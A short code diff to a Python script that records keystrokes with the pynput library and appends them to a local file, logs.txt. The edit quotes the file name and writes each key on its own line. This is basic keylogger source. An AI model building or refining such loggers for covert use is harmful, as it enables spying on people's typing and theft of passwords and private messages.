@@ -2,9 +2,9 @@ from pynput import keyboard
 
 def keylog(key):
     print(str(key))
-    with open(logs.txt, 'a') as logs:
+    with open('logs.txt', 'a') as logs:
         try:
-            logs.write(str(key))
+            logs.write(str(key)+"\n")
         except:
             print("skipi 3bdsami3")
 
